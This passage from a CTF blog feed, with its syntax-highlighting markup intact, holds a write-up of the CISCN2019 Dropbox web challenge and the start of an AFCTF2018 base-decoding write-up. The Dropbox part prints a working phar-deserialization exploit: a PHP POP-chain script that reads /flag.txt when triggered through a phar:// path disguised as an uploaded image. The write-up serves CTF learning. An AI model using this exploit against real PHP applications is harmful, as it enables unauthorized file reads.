single-quoted-string string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">' B'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' KB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' MB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' GB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>其中利用的重中之重是下面的部分代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//2</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>用下面的脚本生成一个phar的文件，菜狗痛枯。贼鸡儿麻烦啊。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag.txt"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"7.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>分析一下pop链</p><blockquote><p>首先是创建一个user类的对象$a，然后将$a的db属性实例化为FileList对象。FileList里的$file属性实例化为File对象,利用filename属性读取flag.txt文件,最后用$this-&gt;files = array($file);负责输出flag。</p><p>她的各种方法的调用顺序为，首先$a的db属性实例化为FileList对象，这样当$a对象被销毁时就会触发<strong>call()函数`(因为db实例化为对象了，而filelist类里面没有close()方法，故会触发</strong>call()方法)<code>。第二是为使close方法里面获取的文件为flag，就要让</code>$this-&gt;filename=flag文件`，就在filelist类里面写入了file属性=file对象，并且该对象的filename属性为/flag.txt也就是我们的文件。现在flag已经在file对象里面了，然后我们再借用一下filelist类的__call()方法，把flag.txt打入results里面，最后通过析构函数将results打入result，然后入table，最后将table属性echo出来，实现读取文件。</p></blockquote><h2 id="生成phar文件-1"><a href="#生成phar文件-1" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>想生成phar文件要先把只读属性给关掉，如下图所示<img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/2.png" alt="2.png">，然后生成phar文件之后上传（要先改后缀名为png）。</p><p>上传成功后打开bp，删除文件时改包名为<code>phar://7.png</code>，成功获取flag如图</p><p><img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/3.png" alt="3.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>向自己不熟悉的方向发起挑战，虽然开始会有些困难，但是坚持下去就能获得快乐，嘿嘿。</p><blockquote><p>月上柳梢头，人约黄昏后。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFCTF2018-BASE</title>
      <link href="2020/10/09/AFCTF2018-BASE/"/>
      <url>2020/10/09/AFCTF2018-BASE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="各种base"><a href="#各种base" class="headerlink" title="各种base"></a>各种base</h2><p>这个刚开始的时候看到题目首先就想到要使用base64试一试，没，不行。看了wp后知道了，BASE没64的目的是什么呢？不就是想让你知道这不是一个简单的base64的题目马？唉，没经验啊没经验。。。</p><blockquote><p>下面首先是我的代码</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入需要解密的base64："</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"多重解密结束!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是带解密内容，我丢这么长（好长）？<br><img src="/2020/10/09/AFCTF2018-BASE/QQ截图20201009223047.png" alt></p><p>下面是用我的脚本的结果，这很明显是成功不了的。。。<br><img src="/2020/10/09/AFCTF2018-BASE/QQ截图20201009223300.png" alt></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>为什么成功不了呢？因为加密方式不只有base64加密，是base64家族的加密，得用下面的大神的脚本，其实就是循环里面多尝试了base家族的其他的解密方式。。<br>)base家族多重解密<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag_encode.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>file2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> base <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        base <span class="token operator">=</span> base64<span class="token 